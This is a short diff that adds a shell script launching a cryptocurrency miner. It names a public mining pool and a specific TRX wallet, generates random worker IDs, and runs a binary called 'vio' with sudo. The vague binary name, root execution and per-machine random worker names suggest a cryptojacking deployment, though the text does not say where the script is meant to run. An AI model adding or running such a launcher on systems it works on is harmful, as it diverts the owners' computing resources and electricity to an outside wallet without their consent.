@@ -1,0 +1,5 @@
+POOL=rx-us.unmineable.com:3333
+WALLET=TRX:TW8kc8Lj61ByD3DTdXukrhFbXio5Ad26xU
+WORKER=$(echo $(shuf -i 1-999999999 -n 1)-VIO)
+ALGO=wrkzcoin
+sudo ./vio --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO
